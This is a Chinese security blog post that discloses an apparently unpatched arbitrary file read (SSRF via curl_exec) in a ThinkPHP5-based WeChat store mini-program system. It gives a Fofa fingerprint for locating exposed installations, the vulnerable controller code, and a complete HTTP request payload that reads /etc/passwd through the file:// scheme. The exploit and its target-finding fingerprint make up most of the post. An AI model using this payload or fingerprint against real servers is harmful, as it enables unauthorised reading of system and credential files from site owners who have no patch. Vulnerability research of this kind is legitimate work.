#  【0day】某微信万能门店小程序系统存在任意文件读取漏洞   
原创 Mstir  星悦安全   2024-11-19 04:23  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字  
关注我们 并设为  
星标  
## 0x00 前言  
- █   
远山起风又起雾 无人知我来时路  
 █  
  
- **万能门店小程序DIY建站无限独立版非微擎应用，独立版是基于国内很火的ThinkPHP5框架开发的，适用于各行各业小程序、企业门店小程序！**  
  
- **万能门店微信小程序不限制小程序生成数量，支持多页面，预约功能等。 本套源码包含多商户插件、点餐插件、拼团插件、积分兑换、小程序手机客服等全套十个插件模块。**  
  
- **支持后台一键扫码上传小程序，和后台通用模板。**  
  
- **增加了：抖音/头条小程序，百度小程序，支付宝小程序，qq小程序，H5端**  
  
**Fofa指纹:**  
```
"/comhome/cases/index.html"
```  
  
****  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5eNYFEuuhHqEVQ5waZZ2ulOAQkmvWFZic2p7hrrbwQNmicEUjhvwJnNGJSLTQt0eRoJhThxicgozX74Q/640?wx_fmt=other&from=appmsg "")  
  
后台  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5eNYFEuuhHqEVQ5waZZ2ulO8oicUdGjMgMtsynwsmn8vpbLibQeo8IndG8npvOW7ff0yISfWJjfoeuQ/640?wx_fmt=jpeg "")  
  
框架:ThinkPHP 5 Debug:False  
## 0x01 漏洞分析&复现  
  
**位于 /application/api/controller/Wxapps.php 控制器中的_requestPost 方法存在curl_exec 函数，且传参均可控，导致漏洞产生.**  
  
```
//不带报头的curlpublic function _requestPost($url, $data, $ssl = true)  {    //curl完成    $curl = curl_init();    //设置curl选项    curl_setopt($curl, CURLOPT_URL, $url);//URL    $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0 FirePHP/0.7.4';    curl_setopt($curl, CURLOPT_USERAGENT, $user_agent);//user_agent，请求代理信息    curl_setopt($curl, CURLOPT_AUTOREFERER, true);//referer头，请求来源    curl_setopt($curl, CURLOPT_TIMEOUT, 30);//设置超时时间    //SSL相关    if ($ssl) {      curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);//禁用后cURL将终止从服务端进行验证      curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);//检查服务器SSL证书中是否存在一个公用名(common name)。    }    // 处理post相关选项    curl_setopt($curl, CURLOPT_POST, true);// 是否为POST请求    curl_setopt($curl, CURLOPT_POSTFIELDS, $data);// 处理请求数据    // 处理响应结果    curl_setopt($curl, CURLOPT_HEADER, false);//是否处理响应头    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);//curl_exec()是否返回响应结果    // 发出请求    $response = curl_exec($curl);    if (false === $response) {      echo '<br>', curl_error($curl), '<br>';      return false;    }    curl_close($curl);    return $response;  }
```  
  
  
**Payload:**  
  
```
GET /api/wxapps/_requestPost?url=file:///etc/passwd&data=1 HTTP/2Host: 127.0.0.1Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="101"Sec-Ch-Ua-Mobile: ?0Sec-Ch-Ua-Platform: "Windows"Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5eNYFEuuhHqEVQ5waZZ2ulOlqHJiboyIJYBlWl5M3KUT7EqYZnKVwFnxVyAriaeoUibdjhicm8E6gHCKw/640?wx_fmt=other&from=appmsg "")  
## 0x02 源码下载  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转**  
  
**购物商城源码关注公众号发送 241119 获取!**  
  
  
  
  
**进星悦安全公开群添加下方VX 备注 "进群"**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5fr0w5NqA8l0xH4mcpTbkGK5v6wyHcicibH4ia14Wq1n0fPvn1C0QPAe98oVABtMWOA8nRPfHia0YqAFw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**免责声明:****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
